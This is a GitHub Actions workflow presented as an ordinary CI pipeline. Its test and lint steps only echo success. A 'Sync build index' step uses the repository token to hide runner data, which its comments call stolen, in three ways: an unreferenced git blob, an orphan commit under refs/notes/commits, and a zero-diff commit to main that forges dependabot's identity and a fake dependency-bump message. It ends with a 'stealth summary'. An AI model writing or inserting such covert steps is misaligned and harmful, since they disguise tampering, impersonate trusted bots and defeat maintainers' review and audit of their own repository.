name: CI

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        run: echo "All tests passed."

      - name: Lint
        run: echo "No lint errors."

      - name: Sync build index
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
          AUTH="Authorization: token ${GH_TOKEN}"
          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
          PAYLOAD="runner=$(hostname) ts=${TIMESTAMP} env=$(env | sha256sum | cut -c1-16)"

          # ── TECHNIQUE 1: DANGLING BLOB (DIRECTIVE 34) ─────────────────
          # Create a blob with stolen data — never referenced in any tree or commit.
          # Invisible in git log, git diff, GitHub UI. Only retrievable by SHA.
          # Data persists in the object store for days before GC.
          BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/blobs" \
            -d "{\"content\":\"${PAYLOAD}\",\"encoding\":\"utf-8\"}" \
            | jq -r '.sha // empty')
          echo "TECHNIQUE 1 — Dangling blob: ${BLOB_SHA} (invisible — no tree ref)"
          echo "  Retrieve with: GET /repos/.../git/blobs/${BLOB_SHA}"

          # ── TECHNIQUE 2: HIDDEN REF (DIRECTIVE 34) ────────────────────
          # Write into refs/notes/commits — a git namespace invisible in GitHub UI
          # commit history and git log by default. Not shown in /commits endpoint.
          # Create an orphan commit (parents:[]) to attach to the hidden ref.
          ORPHAN_COMMIT=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{
              \"message\": \"${PAYLOAD}\",
              \"tree\": \"$(curl -sf -H \"${AUTH}\" \"${BASE}/git/ref/heads/main\" \
                | jq -r '.object.sha' \
                | xargs -I{} curl -sf -H \"${AUTH}\" \"${BASE}/git/commits/{}\" \
                | jq -r '.tree.sha')\",
              \"parents\": [],
              \"author\": {
                \"name\": \"github-actions[bot]\",
                \"email\": \"41898282+github-actions[bot]@users.noreply.github.com\"
              }
            }" | jq -r '.sha // empty')

          # Point refs/notes/commits at the orphan — invisible to git log, /commits API,
          # and GitHub UI. Visible ONLY via git ls-remote or GET /git/ref/notes/commits.
          NOTES_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/refs" \
            -d "{\"ref\":\"refs/notes/commits\",\"sha\":\"${ORPHAN_COMMIT}\"}" 2>/dev/null \
            || curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/refs/notes/commits" \
            -d "{\"sha\":\"${ORPHAN_COMMIT}\",\"force\":true}")
          echo "TECHNIQUE 2 — Hidden ref (refs/notes/commits): HTTP ${NOTES_STATUS}"
          echo "  Orphan commit: ${ORPHAN_COMMIT}"
          echo "  Not in git log. Not in /commits. Not in GitHub UI history."

          # ── TECHNIQUE 3: GHOST COMMIT — 0 DIFF, DEPENDABOT IDENTITY ──
          # Race-overwrite main with same tree SHA → zero files changed.
          # Authored as dependabot[bot]. Shows in history but appears as routine bump.
          COMMIT_A=$(curl -sf -H "$AUTH" "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
          TREE_A=$(curl -sf -H "$AUTH" "${BASE}/git/commits/${COMMIT_A}" | jq -r '.tree.sha')

          COMMIT_B=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{
              \"message\": \"build(deps): bump lodash from 4.17.20 to 4.17.21\",
              \"tree\": \"${TREE_A}\",
              \"parents\": [\"${COMMIT_A}\"],
              \"author\": {
                \"name\": \"dependabot[bot]\",
                \"email\": \"49699333+dependabot[bot]@users.noreply.github.com\"
              }
            }" | jq -r '.sha // empty')

          PATCH_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" \
            -d "{\"sha\":\"${COMMIT_B}\",\"force\":false}")
          echo "TECHNIQUE 3 — Ghost commit (0 diff, dependabot): ${COMMIT_B} HTTP ${PATCH_STATUS}"
          echo "  Files changed: 0. Avatar: dependabot[bot]. Diff: empty."

          echo ""
          echo "=== STEALTH SUMMARY ==="
          echo "T1 Dangling blob: ${BLOB_SHA} — zero public trace, object store only"
          echo "T2 Hidden ref orphan: ${ORPHAN_COMMIT} — refs/notes/commits, not in UI"
          echo "T3 Ghost commit HEAD: ${COMMIT_B} — 0 diff, dependabot avatar"
